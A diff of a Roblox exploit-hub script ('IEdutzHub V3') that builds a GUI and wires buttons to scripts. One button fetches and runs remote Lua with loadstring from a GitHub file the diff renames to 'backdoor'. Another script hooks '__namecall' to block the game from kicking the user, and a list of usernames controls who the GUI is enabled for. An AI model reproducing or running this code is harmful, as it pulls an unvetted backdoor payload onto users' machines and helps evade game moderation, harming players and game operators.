@@ -1,3 +1,4 @@
+
 local _1 = Instance.new("ScreenGui")
 local d = Instance.new("Frame")
 local a = Instance.new("UICorner")
@@ -90,6 +91,7 @@ local I_36 = Instance.new("UIGradient")
 local l_11 = Instance.new("TextLabel")
 local a_9 = Instance.new("UIGradient")
 
+--Properties:
 
 _1.Name = "1"
 _1.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -687,8 +689,9 @@ a_9.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255
 a_9.Name = "a"
 a_9.Parent = d
 
+-- Scripts:
 
-local function WXUH_fake_script() 
+local function YZGMCHZ_fake_script() -- h_3.s 
 	local script = Instance.new('Script', h_3)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -696,8 +699,8 @@ local function WXUH_fake_script()
 	end)
 	
 end
-coroutine.wrap(WXUH_fake_script)()
-local function KOLWV_fake_script() 
+coroutine.wrap(YZGMCHZ_fake_script)()
+local function ULOOSKU_fake_script() -- h_4.s 
 	local script = Instance.new('Script', h_4)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -705,8 +708,8 @@ local function KOLWV_fake_script()
 	end)
 	
 end
-coroutine.wrap(KOLWV_fake_script)()
-local function ISNIRMS_fake_script()
+coroutine.wrap(ULOOSKU_fake_script)()
+local function KJMTW_fake_script() -- h_5.s 
 	local script = Instance.new('Script', h_5)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -714,8 +717,8 @@ local function ISNIRMS_fake_script()
 	end)
 	
 end
-coroutine.wrap(ISNIRMS_fake_script)()
-local function BAEWZMB_fake_script() 
+coroutine.wrap(KJMTW_fake_script)()
+local function TXXT_fake_script() -- h_6.s 
 	local script = Instance.new('Script', h_6)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -723,8 +726,8 @@ local function BAEWZMB_fake_script()
 	end)
 	
 end
-coroutine.wrap(BAEWZMB_fake_script)()
-local function NXQWDZ_fake_script() 
+coroutine.wrap(TXXT_fake_script)()
+local function ZVLZICW_fake_script() -- h_7.s 
 	local script = Instance.new('Script', h_7)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -732,8 +735,8 @@ local function NXQWDZ_fake_script()
 	end)
 	
 end
-coroutine.wrap(NXQWDZ_fake_script)()
-local function WQPI_fake_script() 
+coroutine.wrap(ZVLZICW_fake_script)()
+local function PYJT_fake_script() -- h_8.s 
 	local script = Instance.new('Script', h_8)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -741,8 +744,8 @@ local function WQPI_fake_script()
 	end)
 	
 end
-coroutine.wrap(WQPI_fake_script)()
-local function LJXLKY_fake_script() 
+coroutine.wrap(PYJT_fake_script)()
+local function PGEIR_fake_script() -- h_9.s 
 	local script = Instance.new('Script', h_9)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -750,8 +753,8 @@ local function LJXLKY_fake_script()
 	end)
 	
 end
-coroutine.wrap(LJXLKY_fake_script)()
-local function OTID_fake_script() 
+coroutine.wrap(PGEIR_fake_script)()
+local function EMKLZUR_fake_script() -- d.a 
 	local script = Instance.new('LocalScript', d)
 
 	local UIS = game:GetService("UserInputService")
@@ -792,8 +795,8 @@ local function OTID_fake_script()
 	
 	dragify(script.Parent)
 end
-coroutine.wrap(OTID_fake_script)()
-local function WHAS_fake_script() 
+coroutine.wrap(EMKLZUR_fake_script)()
+local function RXLSSOU_fake_script() -- j_3.m 
 	local script = Instance.new('Script', j_3)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -801,8 +804,8 @@ local function WHAS_fake_script()
 	end)
 	
 end
-coroutine.wrap(WHAS_fake_script)()
-local function KWQQSZ_fake_script() 
+coroutine.wrap(RXLSSOU_fake_script)()
+local function XGFXF_fake_script() -- j_4.p 
 	local script = Instance.new('Script', j_4)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -810,8 +813,8 @@ local function KWQQSZ_fake_script()
 	end)
 	
 end
-coroutine.wrap(KWQQSZ_fake_script)()
-local function PYYZMJ_fake_script()  
+coroutine.wrap(XGFXF_fake_script)()
+local function CZJTK_fake_script() -- j_5.l 
 	local script = Instance.new('Script', j_5)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -819,8 +822,8 @@ local function PYYZMJ_fake_script()
 	end)
 	
 end
-coroutine.wrap(PYYZMJ_fake_script)()
-local function LPMDLVB_fake_script() 
+coroutine.wrap(CZJTK_fake_script)()
+local function EQXPXJ_fake_script() -- j_6.k 
 	local script = Instance.new('Script', j_6)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -828,8 +831,8 @@ local function LPMDLVB_fake_script()
 	end)
 	
 end
-coroutine.wrap(LPMDLVB_fake_script)()
-local function OYJKS_fake_script() 
+coroutine.wrap(EQXPXJ_fake_script)()
+local function KAPKCC_fake_script() -- j_6.k 
 	local script = Instance.new('Script', j_6)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -837,8 +840,8 @@ local function OYJKS_fake_script()
 	end)
 	
 end
-coroutine.wrap(OYJKS_fake_script)()
-local function OQBE_fake_script() 
+coroutine.wrap(KAPKCC_fake_script)()
+local function GSERDMF_fake_script() -- e_3.s 
 	local script = Instance.new('Script', e_3)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -846,8 +849,8 @@ local function OQBE_fake_script()
 	end)
 	
 end
-coroutine.wrap(OQBE_fake_script)()
-local function EZZCHXM_fake_script()  
+coroutine.wrap(GSERDMF_fake_script)()
+local function XMZJEE_fake_script() -- e_4.s 
 	local script = Instance.new('Script', e_4)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -855,8 +858,8 @@ local function EZZCHXM_fake_script()
 	end)
 	
 end
-coroutine.wrap(EZZCHXM_fake_script)()
-local function PFGAG_fake_script() 
+coroutine.wrap(XMZJEE_fake_script)()
+local function EBSUEK_fake_script() -- e_5.s 
 	local script = Instance.new('Script', e_5)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -864,8 +867,8 @@ local function PFGAG_fake_script()
 	end)
 	
 end
-coroutine.wrap(PFGAG_fake_script)()
-local function ACKBUX_fake_script()
+coroutine.wrap(EBSUEK_fake_script)()
+local function CRZECA_fake_script() -- e_6.s 
 	local script = Instance.new('Script', e_6)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -873,8 +876,8 @@ local function ACKBUX_fake_script()
 	end)
 	
 end
-coroutine.wrap(ACKBUX_fake_script)()
-local function FNXGWAN_fake_script() 
+coroutine.wrap(CRZECA_fake_script)()
+local function JDKVR_fake_script() -- l_4.s 
 	local script = Instance.new('Script', l_4)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -882,8 +885,8 @@ local function FNXGWAN_fake_script()
 	end)
 	
 end
-coroutine.wrap(FNXGWAN_fake_script)()
-local function KSBB_fake_script() 
+coroutine.wrap(JDKVR_fake_script)()
+local function JIKUOOQ_fake_script() -- l_5.s 
 	local script = Instance.new('Script', l_5)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -891,17 +894,17 @@ local function KSBB_fake_script()
 	end)
 	
 end
-coroutine.wrap(KSBB_fake_script)()
-local function XMEVQYK_fake_script()  
+coroutine.wrap(JIKUOOQ_fake_script)()
+local function YQIKIN_fake_script() -- l_6.s 
 	local script = Instance.new('Script', l_6)
 
 	script.Parent.MouseButton1Click:Connect(function()
-		loadstring(game:HttpGet(('https://raw.githubusercontent.com/CoochieSlayer6372/SimpleSpyFixed/main/badscript.lua'),true))()
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/kl0nx/ve3/main/backdoor'),true))()
 	end)
 	
 end
-coroutine.wrap(XMEVQYK_fake_script)()
-local function KIJVQQ_fake_script()
+coroutine.wrap(YQIKIN_fake_script)()
+local function NGMYM_fake_script() -- l_7.s 
 	local script = Instance.new('Script', l_7)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -909,8 +912,8 @@ local function KIJVQQ_fake_script()
 	end)
 	
 end
-coroutine.wrap(KIJVQQ_fake_script)()
-local function EPWQ_fake_script()
+coroutine.wrap(NGMYM_fake_script)()
+local function ZECFW_fake_script() -- l_8.s 
 	local script = Instance.new('Script', l_8)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -918,8 +921,8 @@ local function EPWQ_fake_script()
 	end)
 	
 end
-coroutine.wrap(EPWQ_fake_script)()
-local function PODAFNI_fake_script()
+coroutine.wrap(ZECFW_fake_script)()
+local function QFNB_fake_script() -- l_9.s 
 	local script = Instance.new('Script', l_9)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -927,8 +930,8 @@ local function PODAFNI_fake_script()
 	end)
 	
 end
-coroutine.wrap(PODAFNI_fake_script)()
-local function WWKL_fake_script() 
+coroutine.wrap(QFNB_fake_script)()
+local function SGADZ_fake_script() -- l_10.s 
 	local script = Instance.new('Script', l_10)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -936,8 +939,8 @@ local function WWKL_fake_script()
 	end)
 	
 end
-coroutine.wrap(WWKL_fake_script)()
-local function NYZLM_fake_script() 
+coroutine.wrap(SGADZ_fake_script)()
+local function ZGBFPI_fake_script() -- l_10.s 
 	local script = Instance.new('Script', l_10)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -945,21 +948,21 @@ local function NYZLM_fake_script()
 	end)
 	
 end
-coroutine.wrap(NYZLM_fake_script)()
-local function RQRYEBJ_fake_script() 
+coroutine.wrap(ZGBFPI_fake_script)()
+local function HROX_fake_script() -- _1.a 
 	local script = Instance.new('LocalScript', _1)
 
 	
-	
+	--// Variables
 	
 	local Players = game:GetService("Players")
 	local OldNameCall = nil
 	
+	--// Global Variables
 	
+	getgenv().SendNotifications = true -- Set to true if you want to get notified regularly.
 	
-	getgenv().SendNotifications = true
-	
-	
+	--// Anti Kick Hook
 	
 	OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
 		local NameCallMethod = getnamecallmethod()
@@ -983,20 +986,19 @@ local function RQRYEBJ_fake_script()
 	if getgenv().SendNotifications == true then
 		game:GetService("StarterGui"):SetCore("SendNotification", {
 			Title = "IEdutzHub V3",
-			Text = "If you don't see anything, you may got banned from the network.",
+			Text = "IEdutzHub V3 is now ready.",
 			Icon = "rbxassetid://7582544082",
 			Duration = 5,
 		})
 	end
 end
-coroutine.wrap(RQRYEBJ_fake_script)()
-local function ZMQV_fake_script() 
+coroutine.wrap(HROX_fake_script)()
+local function WLMUAMO_fake_script() -- _1.c 
 	local script = Instance.new('LocalScript', _1)
 
 	local balanigga = game.Players.LocalPlayer
 	
-	local nush = {"thatsiedutz",
-		"MetroKiIlerRO",
+	local nush = {"MetroKiIlerRO",
 		"05_AGENT1",
 		"Ultra_Bonie8000",
 		"jandarmeria2020",
@@ -1039,8 +1041,8 @@ local function ZMQV_fake_script()
 		"TheBest_Alex26",
 		"Willy_Hanover",
 		"Guest_31440",
-                "AndreiYKS",
-                "EricWebb2",
+		"AndreiYKS",
+		"EricWebb2",
 		"KellyCannon1",
 		"AryyanaTnt112"
 	}
@@ -1059,8 +1061,8 @@ local function ZMQV_fake_script()
 		tesalut.Enabled = false
 	end
 end
-coroutine.wrap(ZMQV_fake_script)()
-local function JVTKW_fake_script() 
+coroutine.wrap(WLMUAMO_fake_script)()
+local function VDJWBHC_fake_script() -- _1.b 
 	local script = Instance.new('LocalScript', _1)
 
 	local Settings, Data = {
@@ -1071,7 +1073,7 @@ local function JVTKW_fake_script()
 		Orientation = 'Vertical',
 		DisplayNameToName = false,
 		ShowBlockedInName = false
-	}, { 
+	}, { -- [Essential Data] Don't edit this table unless you know what you're doing and want a functional script, please. ;) - mothwa
 		Main = 'rbxasset://LuaPackages/Packages/_Index/UIBlox/UIBlox/App/ImageSet/ImageAtlas/img_set_1x_1.png',
 		Friend = 'rbxasset://LuaPackages/Packages/_Index/UIBlox/UIBlox/App/ImageSet/ImageAtlas/img_set_1x_3.png',
 		BlockedPos = '488, 133',
@@ -1127,7 +1129,7 @@ local function JVTKW_fake_script()
 							NLabel.RichText = false
 							NLabel.Text = TP.Name
 						else
-							if tostring(Status.ImageRectOffset) == Data.FriendPos then 
+							if tostring(Status.ImageRectOffset) == Data.FriendPos then --1
 								if getgenv().ADv5LiveSettings.ApplyToLeaderboard and getgenv().ADv5LiveSettings.ApplyToLeaderboard == true and getgenv().ADv5LiveSettings.IdentifyFriends then
 									NLabel.RichText = true
 									if getgenv().ADv5LiveSettings.Orientation == 'Vertical' or not table.find({'Vertical', 'Horizontal'}, getgenv().ADv5LiveSettings.Orientation) and TP.Name ~= TP.DisplayName then
@@ -1141,7 +1143,7 @@ local function JVTKW_fake_script()
 									NLabel.RichText = false
 									NLabel.Text = TP.DisplayName
 								end
-							elseif tostring(Status.ImageRectOffset) == Data.BlockedPos then 
+							elseif tostring(Status.ImageRectOffset) == Data.BlockedPos then --2
 								if getgenv().ADv5LiveSettings.ApplyToLeaderboard and getgenv().ADv5LiveSettings.ApplyToLeaderboard == true and getgenv().ADv5LiveSettings.ShowBlockedInName then
 									NLabel.RichText = true
 									if getgenv().ADv5LiveSettings.Orientation == 'Vertical' or not table.find({'Vertical', 'Horizontal'}, getgenv().ADv5LiveSettings.Orientation) and TP.Name ~= TP.DisplayName then
@@ -1157,7 +1159,7 @@ local function JVTKW_fake_script()
 									NLabel.RichText = false
 									NLabel.Text = TP.DisplayName
 								end
-							else 
+							else --3
 								if getgenv().ADv5LiveSettings.ApplyToLeaderboard and getgenv().ADv5LiveSettings.ApplyToLeaderboard == true then
 									NLabel.RichText = true
 									if getgenv().ADv5LiveSettings.Orientation == 'Vertical' or not table.find({'Vertical', 'Horizontal'}, getgenv().ADv5LiveSettings.Orientation) and TP.Name ~= TP.DisplayName then
@@ -1216,7 +1218,7 @@ local function JVTKW_fake_script()
 					elseif not getgenv().ADv5LiveSettings.ShowBlockedInName then
 						H.DisplayName = TP.DisplayName
 					end
-				else 
+				else --3
 					if getgenv().ADv5LiveSettings.Orientation == 'Vertical' or not table.find({'Vertical', 'Horizontal'}, getgenv().ADv5LiveSettings.Orientation) and TP.Name ~= TP.DisplayName then
 						H.DisplayName = TP.DisplayName..'\n(@'..TP.Name..')'
 					elseif getgenv().ADv5LiveSettings.Orientation == 'Horizontal' and TP.Name ~= TP.DisplayName then
@@ -1284,4 +1286,4 @@ local function JVTKW_fake_script()
 	
 	getgenv().ADv5LiveSettings = Settings
 end
-coroutine.wrap(JVTKW_fake_script)()
+coroutine.wrap(VDJWBHC_fake_script)()
